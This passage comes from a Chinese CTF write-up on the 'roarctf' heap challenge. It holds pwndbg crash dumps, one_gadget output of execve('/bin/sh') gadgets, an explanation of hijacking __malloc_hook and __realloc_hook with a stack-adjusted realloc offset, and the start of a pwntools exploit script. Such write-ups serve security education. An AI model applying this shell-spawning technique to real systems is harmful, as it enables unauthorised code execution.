<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"> RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x10</span></span><br><span class="line"> RDX  <span class="number">0x11</span></span><br><span class="line"> RDI  <span class="number">0x10</span></span><br><span class="line"> RSI  <span class="number">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x7f55c10ef6e0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R12  <span class="number">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7ffc37dd49f0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x10</span></span><br><span class="line"> RSP  <span class="number">0x7ffc37dd48a0</span> ◂— <span class="number">0x7</span></span><br><span class="line"> RIP  <span class="number">0x7f55c0ffd028</span> (<span class="built_in">calloc</span>+<span class="number">680</span>) ◂— call   rax</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7f55c0ffd028</span> &lt;<span class="built_in">calloc</span>+<span class="number">680</span>&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f55c0ffd02a</span> &lt;<span class="built_in">calloc</span>+<span class="number">682</span>&gt;    xor    esi, esi</span><br><span class="line">   <span class="number">0x7f55c0ffd02c</span> &lt;<span class="built_in">calloc</span>+<span class="number">684</span>&gt;    test   rax, rax</span><br><span class="line">   <span class="number">0x7f55c0ffd02f</span> &lt;<span class="built_in">calloc</span>+<span class="number">687</span>&gt;    mov    rdx, rbp</span><br><span class="line">   <span class="number">0x7f55c0ffd032</span> &lt;<span class="built_in">calloc</span>+<span class="number">690</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x7f55c0ffd035</span> &lt;<span class="built_in">calloc</span>+<span class="number">693</span>&gt;    jne    <span class="built_in">calloc</span>+<span class="number">656</span> &lt;<span class="number">0x7f55c0ffd010</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f55c0ffd037</span> &lt;<span class="built_in">calloc</span>+<span class="number">695</span>&gt;    xor    eax, eax</span><br><span class="line">   <span class="number">0x7f55c0ffd039</span> &lt;<span class="built_in">calloc</span>+<span class="number">697</span>&gt;    jmp    <span class="built_in">calloc</span>+<span class="number">312</span> &lt;<span class="number">0x7f55c0ffceb8</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f55c0ffd03e</span> &lt;<span class="built_in">calloc</span>+<span class="number">702</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x7f55c0ffd040</span> &lt;<span class="built_in">calloc</span>+<span class="number">704</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x33ee31</span>]</span><br><span class="line">   <span class="number">0x7f55c0ffd047</span> &lt;<span class="built_in">calloc</span>+<span class="number">711</span>&gt;    mov    dword ptr fs:[rax], <span class="number">0xc</span></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffc37dd48a0</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7ffc37dd48a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffc37dd48b0</span> —▸ <span class="number">0x7ffc37dd48f0</span> —▸ <span class="number">0x7ffc37dd4910</span> —▸ <span class="number">0x55fafa1d42c0</span> ◂— push   r15</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffc37dd48b8</span> —▸ <span class="number">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffc37dd48c0</span> —▸ <span class="number">0x7ffc37dd49f0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7ffc37dd48c8</span> —▸ <span class="number">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffc37dd48d0</span> ◂— <span class="number">0x7fa1d39a0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffc37dd48d8</span> ◂— <span class="number">0x100000010</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>55c0ffd028 <span class="built_in">calloc</span>+<span class="number">680</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">55f</span>afa1d3cd1</span><br><span class="line">   f <span class="number">2</span>        <span class="number">7f</span>a1d39a0</span><br><span class="line">   f <span class="number">3</span>        <span class="number">100000010</span></span><br><span class="line">   f <span class="number">4</span>        <span class="number">100000006</span></span><br><span class="line">   f <span class="number">5</span>  <span class="number">3b</span>dcd6e58a0f900</span><br><span class="line">   f <span class="number">6</span>     <span class="number">7f</span>fc37dd4910</span><br><span class="line">   f <span class="number">7</span>     <span class="number">55f</span>afa1d4258</span><br><span class="line">   f <span class="number">8</span>        <span class="number">137</span>dd49f0</span><br><span class="line">   f <span class="number">9</span>  <span class="number">3b</span>dcd6e58a0f900</span><br><span class="line">   f <span class="number">10</span>     <span class="number">55f</span>afa1d42c0</span><br><span class="line">Program received signal <span class="title function_">SIGSEGV</span> <span class="params">(fault address <span class="number">0x0</span>)</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> 40</span><br><span class="line">00:0000│ rsp  0x7ffc37dd48a0 ◂— 0x7</span><br><span class="line">01:0008│      0x7ffc37dd48a8 ◂— 0x0</span><br><span class="line">02:0010│      0x7ffc37dd48b0 —▸ 0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class="line">03:0018│      0x7ffc37dd48b8 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class="line">04:0020│      0x7ffc37dd48c0 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class="line">05:0028│      0x7ffc37dd48c8 —▸ 0x55fafa1d3cd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">06:0030│      0x7ffc37dd48d0 ◂— 0x7fa1d39a0</span><br><span class="line">07:0038│      0x7ffc37dd48d8 ◂— 0x100000010</span><br><span class="line">08:0040│      0x7ffc37dd48e0 ◂— 0x100000006</span><br><span class="line">09:0048│      0x7ffc37dd48e8 ◂— 0x3bdcd6e58a0f900</span><br><span class="line">0a:0050│      0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class="line">0b:0058│      0x7ffc37dd48f8 —▸ 0x55fafa1d4258 ◂— jmp    0x55fafa1d42ad</span><br><span class="line">0c:0060│      0x7ffc37dd4900 ◂— 0x137dd49f0</span><br><span class="line">0d:0068│      0x7ffc37dd4908 ◂— 0x3bdcd6e58a0f900</span><br><span class="line">0e:0070│      0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class="line">0f:0078│      0x7ffc37dd4918 —▸ 0<span class="title function_">x7f55c0f98840</span> <span class="params">(__libc_start_main+<span class="number">240</span>)</span> ◂— mov    edi, eax</span><br><span class="line">10:0080│      0x7ffc37dd4920 —▸ 0x7ffc37dd49f8 —▸ 0x7ffc37dd6080 ◂— &#x27;./roarctf&#x27;</span><br><span class="line">... ↓</span><br><span class="line">12:0090│      0x7ffc37dd4930 ◂— 0x1c1104708</span><br><span class="line">13:0098│      0x7ffc37dd4938 —▸ 0x55fafa1d41ec ◂— push   rbp</span><br><span class="line">14:00a0│      0x7ffc37dd4940 ◂— 0x0</span><br><span class="line">15:00a8│      0x7ffc37dd4948 ◂— 0x21d72319ef57efa6</span><br><span class="line">16:00b0│      0x7ffc37dd4950 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class="line">17:00b8│      0x7ffc37dd4958 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class="line">18:00c0│      0x7ffc37dd4960 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1a:00d0│      0x7ffc37dd4970 ◂— 0x75dab899f897efa6</span><br><span class="line">1b:00d8│      0x7ffc37dd4978 ◂— 0x748956d06527efa6</span><br><span class="line">1c:00e0│      0x7ffc37dd4980 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1f:00f8│      0x7ffc37dd4998 —▸ 0x7ffc37dd4a08 —▸ 0x7ffc37dd608a ◂— 0<span class="title function_">x52454d554e5f434c</span> <span class="params">(<span class="string">&#x27;LC_NUMER&#x27;</span>)</span></span><br><span class="line">20:0100│      0x7ffc37dd49a0 —▸ 0x7f55c1569168 —▸ 0x55fafa1d3000 ◂— jg     0x55fafa1d3047</span><br><span class="line">21:0108│      0x7ffc37dd49a8 —▸ 0<span class="title function_">x7f55c135280b</span> <span class="params">(_dl_init+<span class="number">139</span>)</span> ◂— jmp    0x7f55c13527e0</span><br><span class="line">22:0110│      0x7ffc37dd49b0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">24:0120│      0x7ffc37dd49c0 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class="line">25:0128│      0x7ffc37dd49c8 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class="line">26:0130│      0x7ffc37dd49d0 ◂— 0x0</span><br><span class="line">27:0138│      0x7ffc37dd49d8 —▸ 0x55fafa1d39c9 ◂— hlt    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们来看看 onegadegt:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> -l3</span><br><span class="line">/var/lib/gems/<span class="number">2.3</span><span class="number">.0</span>/gems/one_gadget<span class="number">-1.6</span><span class="number">.2</span>/lib/one_gadget/fetchers/base.rb:<span class="number">45</span>: warning: Insecure world writable dir /home/giantbranch in PATH, mode <span class="number">040777</span></span><br><span class="line"><span class="number">0x45226</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4527a</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xcd173</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xcd248</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rax, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [rax] == <span class="literal">NULL</span> || rax == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf03a4</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf03b0</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [[rax]] == <span class="literal">NULL</span> || [rax] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf1247</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf67f0</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, [rbp<span class="number">-0xf8</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0xf8</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0xf8</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个时候我们尝试 realloc_hook,mallo_hook 复写为 realloc，realloc_hook 写为 onegadget ,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"> RBX  <span class="number">0x10</span></span><br><span class="line"> RCX  <span class="number">0x10</span></span><br><span class="line"> RDX  <span class="number">0x7f31162cc02a</span> (<span class="built_in">calloc</span>+<span class="number">682</span>) ◂— xor    esi, esi</span><br><span class="line"> RDI  <span class="number">0x10</span></span><br><span class="line"> RSI  <span class="number">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x7f31163be6e0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R12  <span class="number">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> R13  <span class="number">0x7ffedb4e1860</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x10</span></span><br><span class="line"> RSP  <span class="number">0x7ffedb4e16a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RIP  <span class="number">0x7f31162cb95d</span> (<span class="built_in">realloc</span>+<span class="number">589</span>) ◂— call   rax</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7f31162cb95d</span> &lt;<span class="built_in">realloc</span>+<span class="number">589</span>&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f31162cb95f</span> &lt;<span class="built_in">realloc</span>+<span class="number">591</span>&gt;    mov    rbp, rax</span><br><span class="line">   <span class="number">0x7f31162cb962</span> &lt;<span class="built_in">realloc</span>+<span class="number">594</span>&gt;    jmp    <span class="built_in">realloc</span>+<span class="number">213</span> &lt;<span class="number">0x7f31162cb7e5</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f31162cb967</span> &lt;<span class="built_in">realloc</span>+<span class="number">599</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">   <span class="number">0x7f31162cb970</span> &lt;<span class="built_in">realloc</span>+<span class="number">608</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x33f501</span>]</span><br><span class="line">   <span class="number">0x7f31162cb977</span> &lt;<span class="built_in">realloc</span>+<span class="number">615</span>&gt;    xor    ebp, ebp</span><br><span class="line">   <span class="number">0x7f31162cb979</span> &lt;<span class="built_in">realloc</span>+<span class="number">617</span>&gt;    mov    dword ptr fs:[rax], <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x7f31162cb980</span> &lt;<span class="built_in">realloc</span>+<span class="number">624</span>&gt;    jmp    <span class="built_in">realloc</span>+<span class="number">213</span> &lt;<span class="number">0x7f31162cb7e5</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f31162cb985</span> &lt;<span class="built_in">realloc</span>+<span class="number">629</span>&gt;    nop    dword ptr [rax]</span><br><span class="line">   <span class="number">0x7f31162cb988</span> &lt;<span class="built_in">realloc</span>+<span class="number">632</span>&gt;    lea    rax, [r15 - <span class="number">8</span>]</span><br><span class="line">   <span class="number">0x7f31162cb98c</span> &lt;<span class="built_in">realloc</span>+<span class="number">636</span>&gt;    mov    rbp, rbx</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffedb4e16a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffedb4e16b0</span> —▸ <span class="number">0x7f311681c700</span> ◂— <span class="number">0x7f311681c700</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffedb4e16b8</span> ◂— <span class="number">9</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffedb4e16c0</span> —▸ <span class="number">0x7f311660c6a3</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0x60d780000000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7ffedb4e16c8</span> —▸ <span class="number">0x7ffedb4e1860</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffedb4e16d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>31162cb95d <span class="built_in">realloc</span>+<span class="number">589</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>31162cc02a <span class="built_in">calloc</span>+<span class="number">682</span></span><br><span class="line">   f <span class="number">2</span>     <span class="number">55f</span>c4e86dcd1</span><br><span class="line">   f <span class="number">3</span>        <span class="number">74e86</span>d9a0</span><br><span class="line">   f <span class="number">4</span>        <span class="number">100000010</span></span><br><span class="line">   f <span class="number">5</span>        <span class="number">100000006</span></span><br><span class="line">   f <span class="number">6</span> <span class="number">54</span>a26cc778083a00</span><br><span class="line">   f <span class="number">7</span>     <span class="number">7f</span>fedb4e1780</span><br><span class="line">   f <span class="number">8</span>     <span class="number">55f</span>c4e86e258</span><br><span class="line">   f <span class="number">9</span>        <span class="number">1</span>db4e1860</span><br><span class="line">   f <span class="number">10</span> <span class="number">54</span>a26cc778083a00</span><br><span class="line">Program received signal <span class="title function_">SIGSEGV</span> <span class="params">(fault address <span class="number">0x0</span>)</span></span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> 20</span><br><span class="line">00:0000│ rsp  0x7ffedb4e16a0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">02:0010│      0x7ffedb4e16b0 —▸ 0x7f311681c700 ◂— 0x7f311681c700</span><br><span class="line">03:0018│      0x7ffedb4e16b8 ◂— 9 <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line">04:0020│      0x7ffedb4e16c0 —▸ 0<span class="title function_">x7f311660c6a3</span> <span class="params">(_IO_2_1_stdout_+<span class="number">131</span>)</span> ◂— 0x60d780000000000a <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line">05:0028│      0x7ffedb4e16c8 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class="line">06:0030│      0x7ffedb4e16d0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0040│      0x7ffedb4e16e0 ◂— 0x10</span><br><span class="line">09:0048│      0x7ffedb4e16e8 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class="line">0a:0050│      0x7ffedb4e16f0 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class="line">0b:0058│      0x7ffedb4e16f8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0d:0068│      0x7ffedb4e1708 —▸ 0<span class="title function_">x7f31162cc02a</span> <span class="params">(<span class="built_in">calloc</span>+<span class="number">682</span>)</span> ◂— xor    esi, esi</span><br><span class="line">0e:0070│      0x7ffedb4e1710 ◂— 0x7</span><br><span class="line">0f:0078│      0x7ffedb4e1718 ◂— 0x0</span><br><span class="line">10:0080│      0x7ffedb4e1720 —▸ 0x7ffedb4e1760 —▸ 0x7ffedb4e1780 —▸ 0x55fc4e86e2c0 ◂— push   r15</span><br><span class="line">11:0088│      0x7ffedb4e1728 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class="line">12:0090│      0x7ffedb4e1730 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class="line">13:0098│      0x7ffedb4e1738 —▸ 0x55fc4e86dcd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里 rsp+0x30 为 0，就满足了一个 onegadget.</p>
<p>有时候 realloc 仍旧无法满足，那么我们尝试 realloc 偏移，realloc 调栈 的原理在于其调用 realloc_hook 前，会有多个 push 操作，利用这个可以是默写栈空间经过操作偏移后，满足要求。</p>
<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp:</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,29287)</span></span><br><span class="line">r=process(<span class="string">&quot;./roarctf&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span 